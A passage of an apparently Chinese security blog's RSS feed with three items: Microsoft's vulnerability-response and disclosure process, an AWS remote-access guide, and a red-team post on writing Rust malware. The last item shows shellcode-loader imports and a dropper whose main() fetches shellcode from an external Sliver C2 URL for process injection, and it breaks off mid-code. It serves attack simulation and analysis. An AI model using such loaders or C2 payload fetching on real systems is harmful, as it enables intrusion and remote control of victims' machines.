&lt;p&gt;每个漏洞都具有独特性，需要解决特定的技术挑战。从问题发现到安全更新发布的时间长度受多重因素影响。我们必须考虑更新发布后对客户环境的实际影响，这包括：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;跨产品服务的多样化客户环境&lt;/li&gt;
&lt;li&gt;存在漏洞的受支持平台数量&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;更新开发遵循严格流程：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;取证调查&lt;/strong&gt;：漏洞发现后立即启动，分析研究者报告内容并与代码库进行映射&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;变种分析&lt;/strong&gt;：搜索并研究该漏洞的变种，确保全面修复&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;跨服务影响评估&lt;/strong&gt;：检查漏洞对微软全线服务的影响&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;合作伙伴协同&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;通过MAPP计划向安全合作伙伴提供检测指南&lt;/li&gt;
&lt;li&gt;通过SUVP程序与外部合作伙伴进行实际测试&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;质量验证&lt;/strong&gt;：更新需通过严格测试确保无副作用&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;发布决策&lt;/strong&gt;：满足质量标准后纳入&amp;quot;补丁星期二&amp;quot;或进行带外发布&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;同时会准备CVE文档，包含：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;漏洞指南&lt;/li&gt;
&lt;li&gt;常见问题解答&lt;/li&gt;
&lt;li&gt;现有缓解措施&lt;/li&gt;
&lt;li&gt;更新链接&lt;/li&gt;
&lt;li&gt;发布说明&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;这些信息均发布于《安全更新指南》。&lt;/p&gt;
&lt;h3 id=&#34;什么是零日漏洞&#34;&gt;什么是零日漏洞？
&lt;/h3&gt;&lt;p&gt;零日漏洞指尚未发布官方补丁的软件缺陷。软件供应商可能知晓或不知晓该漏洞。这类漏洞通常具有高严重性，可能被积极利用。&lt;/p&gt;
&lt;p&gt;但并非所有零日漏洞都会导致攻击。攻击复杂度、安装基数可用性和利用可靠性都是攻击者考虑的因素。&lt;/p&gt;
&lt;h3 id=&#34;协调漏洞披露cvd&#34;&gt;协调漏洞披露(CVD)
&lt;/h3&gt;&lt;p&gt;我们坚信CVD是缓解零日漏洞风险的最佳实践。其核心目标是：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;为客户提供及时一致的防护指南&lt;/li&gt;
&lt;li&gt;通过研究者协作限制攻击者机会窗口&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;微软要求研究者直接向我们报告新发现漏洞，在公开前给予我们诊断和修复的机会。符合奖励计划范围的漏洞研究者将获得奖金和公开致谢。&lt;/p&gt;
&lt;p&gt;当攻击广泛进行而微软尚未完成补丁时，我们将与研究者紧密协作提前披露漏洞。&lt;/p&gt;
&lt;h3 id=&#34;客户最佳实践&#34;&gt;客户最佳实践
&lt;/h3&gt;&lt;p&gt;建议客户保持系统处于最新状态：
&amp;ldquo;您的技术基础设施和安防系统就像&amp;rsquo;免疫系统&amp;rsquo;。即使没有零日更新，保持系统更新也能增强整体防护能力。&amp;rdquo; ——Aanchal Gupta&lt;/p&gt;
&lt;p&gt;攻击者常组合使用：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;零日漏洞&lt;/li&gt;
&lt;li&gt;已修复但未更新的旧漏洞&lt;/li&gt;
&lt;li&gt;社会工程攻击&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;关键防护措施：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;定期更新&lt;/strong&gt;：遵循&amp;quot;补丁星期二&amp;quot;节奏&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;利用安全工具&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;Microsoft 365 Defender的威胁与漏洞管理功能&lt;/li&gt;
&lt;li&gt;安全更新指南中的CVSS评分和可利用性指数&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;安全意识&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;仅从官方商店下载软件&lt;/li&gt;
&lt;li&gt;验证可疑附件和链接&lt;/li&gt;
&lt;li&gt;启用多因素认证&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;对于IT管理员：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;使用安全更新指南规划部署&lt;/li&gt;
&lt;li&gt;通过威胁分析报告获取攻击上下文&lt;/li&gt;
&lt;li&gt;优先处理高可利用性漏洞&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>AWS远程访问指南：混合办公环境的安全技术方案</title>
        <link>http://localhost:1313/p/aws%E8%BF%9C%E7%A8%8B%E8%AE%BF%E9%97%AE%E6%8C%87%E5%8D%97%E6%B7%B7%E5%90%88%E5%8A%9E%E5%85%AC%E7%8E%AF%E5%A2%83%E7%9A%84%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E6%96%B9%E6%A1%88/</link>
        <pubDate>Sat, 02 Aug 2025 22:00:53 +0800</pubDate>
        
        <guid>http://localhost:1313/p/aws%E8%BF%9C%E7%A8%8B%E8%AE%BF%E9%97%AE%E6%8C%87%E5%8D%97%E6%B7%B7%E5%90%88%E5%8A%9E%E5%85%AC%E7%8E%AF%E5%A2%83%E7%9A%84%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E6%96%B9%E6%A1%88/</guid>
        <description>&lt;h1 id=&#34;aws远程访问指南混合办公环境的安全技术方案&#34;&gt;AWS远程访问指南：混合办公环境的安全技术方案
&lt;/h1&gt;&lt;p&gt;Amazon Web Services（AWS）客户可通过安全远程访问云资源，在保障业务敏捷性的同时满足灵活办公需求。随着混合办公模式普及，AWS提供完整的安全解决方案，帮助企业在允许远程访问的前提下维护资源保护、访问控制及合规要求。&lt;/p&gt;
&lt;h2 id=&#34;关键技术用例&#34;&gt;关键技术用例
&lt;/h2&gt;&lt;p&gt;本文重点解决以下场景：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;用户访问VPC内部署的Web应用&lt;/li&gt;
&lt;li&gt;运维人员访问VPC内的EC2/RDS实例&lt;/li&gt;
&lt;li&gt;分析师访问Amazon S3敏感数据&lt;/li&gt;
&lt;li&gt;用户访问SAML 2.0/OAuth 2.0应用&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;远程访问核心挑战&#34;&gt;远程访问核心挑战
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;成本控制&lt;/strong&gt;：解决方案的经济性评估&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;暴露面扩大&lt;/strong&gt;：需保护身份、设备及通信链路&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;社会工程风险&lt;/strong&gt;：人为因素成为安全薄弱环节&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;用户体验&lt;/strong&gt;：不良UX设计可能引发操作风险&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;五大技术方案详解&#34;&gt;五大技术方案详解
&lt;/h2&gt;&lt;h3 id=&#34;1-网络层方案network-based&#34;&gt;1. 网络层方案（Network-based）
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;核心服务&lt;/strong&gt;：AWS Client VPN&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;基于OpenVPN客户端实现VPC安全接入&lt;/li&gt;
&lt;li&gt;支持企业IDP联合证书双重认证&lt;/li&gt;
&lt;li&gt;通过CIDR授权规则实现网络级访问控制&lt;/li&gt;
&lt;li&gt;典型架构：用户设备 → Client VPN → VPC端点 → 目标资源&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;2-主机层方案host-based&#34;&gt;2. 主机层方案（Host-based）
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;关键技术对比&lt;/strong&gt;：&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;服务&lt;/th&gt;
          &lt;th&gt;协议&lt;/th&gt;
          &lt;th&gt;认证方式&lt;/th&gt;
          &lt;th&gt;可见性&lt;/th&gt;
          &lt;th&gt;成本模型&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;Systems Manager&lt;/td&gt;
          &lt;td&gt;SSH/RDP&lt;/td&gt;
          &lt;td&gt;IAM策略&lt;/td&gt;
          &lt;td&gt;CloudTrail全日志&lt;/td&gt;
          &lt;td&gt;免费（EC2场景）&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;EC2 Instance Connect&lt;/td&gt;
          &lt;td&gt;原生SSH&lt;/td&gt;
          &lt;td&gt;短期密钥&lt;/td&gt;
          &lt;td&gt;连接级审计&lt;/td&gt;
          &lt;td&gt;无附加费用&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;3-终端用户计算euc&#34;&gt;3. 终端用户计算（EUC）
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;服务选型&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Amazon WorkSpaces&lt;/strong&gt;：持久化云桌面（WSP/PCoIP协议）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;AppStream 2.0&lt;/strong&gt;：按需应用流式传输（NICE DCV协议）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;安全优势&lt;/strong&gt;：数据永不离开VPC，仅传输加密像素流&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;4-应用层方案application-based&#34;&gt;4. 应用层方案（Application-based）
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;IAM Identity Center核心能力&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;统一管理SAML 2.0/OAuth 2.0应用访问&lt;/li&gt;
&lt;li&gt;内置支持Amazon QuickSight等AWS托管应用&lt;/li&gt;
&lt;li&gt;与企业AD/SAML IDP无缝集成&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;5-零信任模型&#34;&gt;5. 零信任模型
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;AWS Verified Access关键技术&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;基于Cedar策略的细粒度授权&lt;/li&gt;
&lt;li&gt;集成设备信号增强决策上下文&lt;/li&gt;
&lt;li&gt;每个请求的完整日志记录（HTTP/TCP层）&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;技术选型决策矩阵&#34;&gt;技术选型决策矩阵
&lt;/h2&gt;&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;解决方案&lt;/th&gt;
          &lt;th&gt;信任边界&lt;/th&gt;
          &lt;th&gt;协议支持&lt;/th&gt;
          &lt;th&gt;授权粒度&lt;/th&gt;
          &lt;th&gt;成本因素&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;Client VPN&lt;/td&gt;
          &lt;td&gt;网络子网&lt;/td&gt;
          &lt;td&gt;IP层&lt;/td&gt;
          &lt;td&gt;CIDR块级&lt;/td&gt;
          &lt;td&gt;连接时长×终端数&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Verified Access&lt;/td&gt;
          &lt;td&gt;应用实例&lt;/td&gt;
          &lt;td&gt;HTTP(S)/TCP&lt;/td&gt;
          &lt;td&gt;属性基策略&lt;/td&gt;
          &lt;td&gt;应用数×带宽消耗&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;WorkSpaces&lt;/td&gt;
          &lt;td&gt;虚拟桌面&lt;/td&gt;
          &lt;td&gt;WSP&lt;/td&gt;
          &lt;td&gt;组成员关系&lt;/td&gt;
          &lt;td&gt;实例类型×运行时长&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;实施建议&#34;&gt;实施建议
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;资产分类&lt;/strong&gt;：明确需访问的资源关键等级&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;可见性设计&lt;/strong&gt;：确保满足合规审计要求&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;混合部署&lt;/strong&gt;：不同场景组合使用多方案（如内部员工用Session Manager，外包人员用AppStream 2.0）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;参考架构&lt;/strong&gt;：遵循&lt;a class=&#34;link&#34; href=&#34;https://docs.aws.amazon.com/prescriptive-guidance/latest/security-reference-architecture/welcome.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;AWS安全参考架构&lt;/a&gt;设计部署模型&lt;/li&gt;
&lt;/ol&gt;
</description>
        </item>
        <item>
        <title>Rust在恶意软件开发中的优势与实践</title>
        <link>http://localhost:1313/p/rust%E5%9C%A8%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91%E4%B8%AD%E7%9A%84%E4%BC%98%E5%8A%BF%E4%B8%8E%E5%AE%9E%E8%B7%B5/</link>
        <pubDate>Sat, 02 Aug 2025 21:49:26 +0800</pubDate>
        
        <guid>http://localhost:1313/p/rust%E5%9C%A8%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91%E4%B8%AD%E7%9A%84%E4%BC%98%E5%8A%BF%E4%B8%8E%E5%AE%9E%E8%B7%B5/</guid>
        <description>&lt;h1 id=&#34;rust在恶意软件开发中的应用&#34;&gt;Rust在恶意软件开发中的应用
&lt;/h1&gt;&lt;h2 id=&#34;引言&#34;&gt;引言
&lt;/h2&gt;&lt;p&gt;作者分享了学习Rust进行恶意软件开发的经历，旨在提升模拟真实攻击的能力。Rust因其固有的反分析特性成为首选语言，能开发更具隐蔽性的工具。&lt;/p&gt;
&lt;h2 id=&#34;rust与c语言的对比分析&#34;&gt;Rust与C语言的对比分析
&lt;/h2&gt;&lt;p&gt;近年来，Go、Nim和Rust等语言在恶意软件作者中日益流行，主要基于两个假设：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;这些语言编译的二进制文件比C/C++更难逆向分析&lt;/li&gt;
&lt;li&gt;非常规语言开发的恶意软件更容易绕过基于签名的检测机制&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;2023年罗切斯特理工学院的一项研究证实：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Rust二进制文件显著大于C/C++版本&lt;/li&gt;
&lt;li&gt;自动化分析工具对Rust程序产生更多误报和漏报&lt;/li&gt;
&lt;li&gt;Ghidra和IDA Free等工具对Rust二进制文件的反编译效果较差&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;实例分析shellcode加载器&#34;&gt;实例分析：Shellcode加载器
&lt;/h2&gt;&lt;p&gt;通过功能相同的Rust和C版shellcode加载器进行对比：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-rust&#34; data-lang=&#34;rust&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;use&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;std&lt;/span&gt;::&lt;span class=&#34;n&#34;&gt;fs&lt;/span&gt;::&lt;span class=&#34;n&#34;&gt;File&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;use&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;std&lt;/span&gt;::&lt;span class=&#34;n&#34;&gt;ptr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;use&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;std&lt;/span&gt;::&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;::&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;bp&#34;&gt;self&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Read&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;};&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;use&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;windows&lt;/span&gt;::&lt;span class=&#34;n&#34;&gt;Win32&lt;/span&gt;::&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;System&lt;/span&gt;::&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Threading&lt;/span&gt;::&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;CreateThread&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;WaitForSingleObject&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;no&#34;&gt;THREAD_CREATION_FLAGS&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;no&#34;&gt;INFINITE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;},&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Memory&lt;/span&gt;::&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;VirtualAlloc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;VirtualProtect&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;no&#34;&gt;MEM_COMMIT&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;no&#34;&gt;MEM_RESERVE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;no&#34;&gt;PAGE_READWRITE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;no&#34;&gt;PAGE_EXECUTE_READWRITE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;no&#34;&gt;PAGE_PROTECTION_FLAGS&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;},&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;},&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Foundation&lt;/span&gt;::&lt;span class=&#34;n&#34;&gt;CloseHandle&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;};&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;编译后，Rust程序(151.5KB)几乎是C程序(71.7KB)的两倍，这是因为Rust默认静态链接依赖项。&lt;/p&gt;
&lt;h2 id=&#34;ghidra逆向分析对比&#34;&gt;Ghidra逆向分析对比
&lt;/h2&gt;&lt;p&gt;Rust程序的反编译输出难以理解，原因包括：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Ghidra尝试将Rust反编译为伪C代码，但内存管理和优化差异导致难以理解&lt;/li&gt;
&lt;li&gt;rustc的编译优化导致函数边界模糊，汇编代码高度优化&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;相比之下，C程序的反编译输出与源代码高度一致。&lt;/p&gt;
&lt;h2 id=&#34;开发rust恶意软件投放器&#34;&gt;开发Rust恶意软件投放器
&lt;/h2&gt;&lt;p&gt;构建一个投放器演示，功能包括：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;枚举目标进程以注入payload&lt;/li&gt;
&lt;li&gt;使用文件映射注入技术执行payload&lt;/li&gt;
&lt;li&gt;通过HTTPS部署Sliver C2框架&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;关键代码模块：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-rust&#34; data-lang=&#34;rust&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;mod&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;enumerate_processes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;mod&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;remote_mapping_injection&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;mod&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;http_client&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;fn&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;let&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;String&lt;/span&gt;::&lt;span class=&#34;n&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;https://sliver.nrcerne.com:8444/DULL_EQUIPMENT&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;let&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shellcode&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;http_client&lt;/span&gt;::&lt;span class=&#34;n&#34;&gt;get_payload_bytes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;).&lt;/span&gt;&lt;span 